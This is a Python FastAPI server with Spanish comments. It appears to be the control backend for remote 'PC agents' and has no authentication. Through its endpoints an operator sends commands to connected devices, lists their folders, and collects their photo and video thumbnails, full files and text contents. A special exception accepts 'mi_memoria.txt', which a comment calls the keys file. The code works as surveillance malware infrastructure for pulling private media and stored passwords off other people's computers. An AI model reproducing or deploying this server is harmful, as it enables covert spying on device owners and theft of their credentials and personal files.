import base64
import json
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any
from urllib.parse import unquote

app = FastAPI(title="Agente PC - Servidor Universal Pro")

# Configuración de CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- "BASE DE DATOS" EN MEMORIA ---
connected_agents: Dict[str, Dict[str, Any]] = {}
device_media_cache: Dict[str, Dict[str, Any]] = {}
fetch_status: Dict[str, str] = {}
directory_cache: Dict[str, Dict[str, Any]] = {}
file_content_cache: Dict[str, str] = {}

# --- MODELOS DE DATOS ---
class Command(BaseModel):
    target_id: str
    action: str
    payload: str = ""

# --- ENDPOINTS DE CONEXIÓN ---

@app.get("/")
async def root():
    return {"status": "online", "message": "Servidor Universal Activo"}

@app.websocket("/ws/{device_id}/{device_name:path}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    await websocket.accept()
    name = unquote(device_name)
    print(f"[CONEXIÓN] Agente PC conectado: {name}")
    connected_agents[device_id] = {"ws": websocket, "name": name}
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        print(f"[DESCONEXIÓN] Agente PC desconectado: {name}")
        if device_id in connected_agents: del connected_agents[device_id]

@app.get("/api/get-agents")
async def get_agents():
    return [{"id": d_id, "name": data["name"]} for d_id, data in connected_agents.items()]

@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    agent = connected_agents.get(command.target_id)
    if not agent:
        return {"status": "error", "message": "Agente no conectado"}
    
    # Al pedir miniaturas, reseteamos para recibir lo nuevo
    if command.action == "get_thumbnails":
        device_media_cache[command.target_id] = {}
        fetch_status[command.target_id] = "loading"
    
    try:
        await agent["ws"].send_text(command.json())
        return {"status": "success"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# --- MANEJO DE MEDIOS (FOTOS/VIDEOS) - VERSIÓN FLEXIBLE ---

@app.post("/api/submit_media_chunk/{device_id}")
async def submit_media_chunk(device_id: str, payload: dict):
    """Recibe lotes de miniaturas de forma flexible para evitar errores 422."""
    if device_id not in device_media_cache:
        device_media_cache[device_id] = {}
    
    thumbnails = payload.get("thumbnails", [])
    for thumb in thumbnails:
        filename = thumb.get("filename")
        if filename:
            # Guardamos todo el objeto (filename, filepath, small_thumb_b64)
            device_media_cache[device_id][filename] = thumb
    
    if payload.get("is_final_chunk"):
        fetch_status[device_id] = "complete"
    
    print(f"Recibidas {len(thumbnails)} miniaturas de {device_id[:8]}.")
    return {"status": "ok"}

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    return {
        "status": fetch_status.get(device_id, "complete"),
        "thumbnails": device_media_cache.get(device_id, {})
    }

# --- SUBIDA Y VISUALIZACIÓN HD (INCLUYE MI_MEMORIA.TXT) ---

@app.post("/api/upload_original_file/{device_id}/{filename:path}")
async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
    name = unquote(filename)
    
    # Excepción para el archivo de claves: creamos el espacio si no existe
    if name == "mi_memoria.txt":
        if device_id not in device_media_cache: device_media_cache[device_id] = {}
        if name not in device_media_cache[device_id]:
            device_media_cache[device_id][name] = {"filename": name}
    
    # Si el archivo no está en la lista de escaneo y no es la memoria, lo rechazamos por seguridad
    if device_id not in device_media_cache or name not in device_media_cache[device_id]:
        return Response(content='{"detail":"Archivo no solicitado"}', status_code=400, media_type="application/json")
    
    file_bytes = await file.read()
    device_media_cache[device_id][name]['original_b64'] = base64.b64encode(file_bytes).decode('utf-8')
    print(f"Archivo HD recibido: {name}")
    return {"status": "success"}

@app.get("/media/{device_id}/{filename:path}")
async def get_large_media(device_id: str, filename: str):
    name = unquote(filename)
    item = device_media_cache.get(device_id, {}).get(name)
    
    if not item or 'original_b64' not in item:
        return Response(content='{"detail":"Archivo no disponible"}', status_code=404, media_type="application/json")
    
    file_bytes = base64.b64decode(item['original_b64'])
    fn_lower = name.lower()
    
    # MIME Types inteligentes para que el navegador sepa qué hacer
    if fn_lower.endswith(('.jpg', '.jpeg')): m_type = "image/jpeg"
    elif fn_lower.endswith('.png'): m_type = "image/png"
    elif fn_lower.endswith(('.mp4', '.mkv', '.avi', '.mov')): m_type = "video/mp4"
    elif fn_lower.endswith(('.txt', '.dat')): m_type = "text/plain; charset=utf-8"
    else: m_type = "application/octet-stream"
    
    return Response(content=file_bytes, media_type=m_type)

# --- EXPLORADOR DE CARPETAS ---

@app.post("/api/submit_directory_listing/{device_id}")
async def submit_directory_listing(device_id: str, listing: dict):
    directory_cache[device_id] = listing
    return {"status": "ok"}

@app.get("/api/get_directory_listing/{device_id}")
async def get_directory_listing(device_id: str):
    return directory_cache.get(device_id, {"current_path": "Raíz", "folders": [], "files": []})

@app.post("/api/submit_file_content/{device_id}")
async def submit_file_content(device_id: str, data: dict):
    file_content_cache[device_id] = data.get("content", "")
    return {"status": "ok"}

@app.get("/view_text/{device_id}")
async def view_text(device_id: str):
    return Response(content=file_content_cache.get(device_id, ""), media_type="text/plain; charset=utf-8")
